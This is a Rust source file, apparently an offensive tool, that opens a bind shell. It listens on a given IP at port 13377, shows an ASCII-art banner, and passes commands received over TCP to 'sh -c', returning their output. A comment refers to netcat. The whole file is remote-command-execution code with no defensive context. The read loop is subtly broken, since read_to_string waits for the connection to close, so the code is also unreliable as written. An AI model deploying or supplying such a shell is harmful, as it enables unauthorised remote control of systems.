use std::env;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};

fn main() {
    let ascii_art = r#"
        _____            _      _____          _
       |  __ \          | |    / ____|        | |
       | |__) |___  __ _| |___| |     ___   __| | ___
       |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
       | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
       |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
    "#;

    let po = 13377; // nc -l -p 13377
    let args: Vec<String> = env::args().collect();

    if args.len() < 2 {
        eprintln!("Please provide the IP address as a command-line argument.");
        std::process::exit(1);
    }

    let ip = &args[1];
    let listener = TcpListener::bind(format!("{}:{}", ip, po)).expect("Listener failed to bind");
    println!("Listening on {}:{}", ip, po);

    for stream in listener.incoming() {
        match stream {
            Ok(mut tcp_stream) => {
                tcp_stream.write_all(ascii_art.as_bytes()).expect("Failed to write to stream");

                loop {
                    tcp_stream.write_all(b"\n$ ").expect("Failed to write to stream");

                    let mut cmd = String::new();
                    tcp_stream.read_to_string(&mut cmd).expect("Failed to read from stream");

                    if cmd.trim() == "exit" {
                        break;
                    } else {
                        let output = std::process::Command::new("sh")
                            .arg("-c")
                            .arg(&cmd)
                            .output()
                            .expect("Failed to execute command");

                        tcp_stream.write_all(&output.stdout).expect("Failed to write to stream");
                        tcp_stream.write_all(&output.stderr).expect("Failed to write to stream");
                    }
                }
            }
            Err(e) => {
                eprintln!("Error: {}", e);
            }
        }
    }
}
